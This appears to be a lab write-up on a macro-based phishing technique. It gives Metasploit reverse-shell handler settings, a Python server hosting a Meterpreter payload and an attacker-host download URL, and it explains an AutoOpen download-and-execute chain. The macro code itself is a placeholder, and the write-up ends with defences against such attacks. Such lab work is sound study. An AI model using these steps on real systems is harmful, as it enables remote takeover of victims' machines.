# Task 1 — Malicious Macro Delivery
 
**Objective:** Create a Microsoft Word macro that downloads and executes a payload when the document is opened, demonstrating the macro-based phishing technique used in real-world campaigns.
 
**MITRE ATT&CK:**
- `T1566` — Phishing
- `T1204.002` — User Execution: Malicious File
- `T1059.005` — Command and Scripting Interpreter: Visual Basic
- `T1105` — Ingress Tool Transfer
---
 
## What Worked
 
The setup relies on **two separate services on the Kali attack box, running on two different ports**:
 
| Service | Port | Purpose |
|---|---|---|
| Python HTTP server | `8080` | Hosts the payload so the macro can download it |
| Metasploit handler | `4444` | Catches the Meterpreter session after the payload runs |
 
### Steps
 
1. **Generated an x64 Meterpreter executable** matching the 64-bit Windows 10 target. Confirmed the architecture before serving it:
```bash
   file <payload>.exe
   # -> PE32+ executable for MS Windows, x86-64   (correct: 64-bit)
```
   > Payload generation command — paste your own `msfvenom` command here:
   > ```bash
   > # <your msfvenom payload-generation command>
   > ```
 
2. **Started the HTTP server** from the directory containing the payload:
```bash
   python3 -m http.server 8080
```
 
3. **Started the Metasploit handler** on a non-conflicting port, with the payload set to match the exe exactly:
```
   use exploit/multi/handler
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST <kali-ip>
   set LPORT 4444
   exploit -j
```
 
4. **Created the macro in Word:** `View > Macros > View Macros`, named it **`AutoOpen`**, clicked **Create**, and pasted the macro. Set `strURL` to point at the HTTP server:
```
   http://<kali-ip>:8080/<payload-filename>.exe
```
 
5. **Ran the macro.** It downloaded the exe over HTTP, saved it to `%USERPROFILE%\Documents\launcher.exe`, and executed it. A Meterpreter session landed on the handler.
### Macro Code
 
```vba
' paste the AutoOpen macro here
```
 
---
 
## How This Achieves Code Execution
 
This is a **staged delivery**. The document itself contains no executable — only a few lines of VBA that fetch the payload at runtime. The flow is:
 
1. The victim opens the document. Because the procedure is named **`AutoOpen`**, it runs automatically (the only user interaction is enabling macros).
2. The macro uses `MSXML2.XMLHTTP` to make an HTTP GET request to the attacker's HTTP server and pull down the executable.
3. `ADODB.Stream` writes the downloaded bytes to disk as `launcher.exe`.
4. `WScript.Shell` runs the file.
5. The running executable calls back to the Metasploit handler, giving the attacker a session.
Splitting the **file delivery** (HTTP server) from the **session callback** (handler) is why two ports are involved. Staging keeps the lure document small and clean — no embedded binary to scan — and lets the attacker swap the hosted payload at any time without re-sending the phishing email.
 
---
 
## Questions
 
### Why is the "AutoOpen" macro name significant?
 
`AutoOpen` is a reserved VBA procedure name that Word executes **automatically the moment the document is opened** (its VBA-project equivalent is `Document_Open`). Naming the subroutine `AutoOpen` means the attacker doesn't need to socially engineer the victim into clicking a button or running anything manually — simply opening the document (and enabling macros, if prompted) triggers the payload. This automatic execution on open is what makes the technique viable for phishing at scale.
 
### What defensive measures can organizations implement to block macro-based attacks?
 
- **Block macros by default**, especially in files from the internet. Modern Office blocks VBA macros in documents carrying the Mark-of-the-Web (MOTW) by default.
- **Allow only digitally signed macros** from trusted publishers via Group Policy; block or disable everything else.
- **Attack Surface Reduction (ASR) rules**, particularly:
  - *Block Office applications from creating child processes*
  - *Block Win32 API calls from Office macros*
  - *Block executable content from email client and webmail*
- **Protected View** for documents originating from the internet or email attachments.
- **Endpoint/EDR detection** for anomalous behavior such as `winword.exe` spawning `cmd.exe`/`powershell.exe` or making outbound connections to fetch an executable — Word has no legitimate reason to download a binary.
- **Application allowlisting** so downloaded executables can't run even if written to disk.
- **Network egress filtering/monitoring** for Office processes reaching out to raw `.exe` URLs.
- **User awareness training** — don't enable macros on unexpected or unsolicited documents.

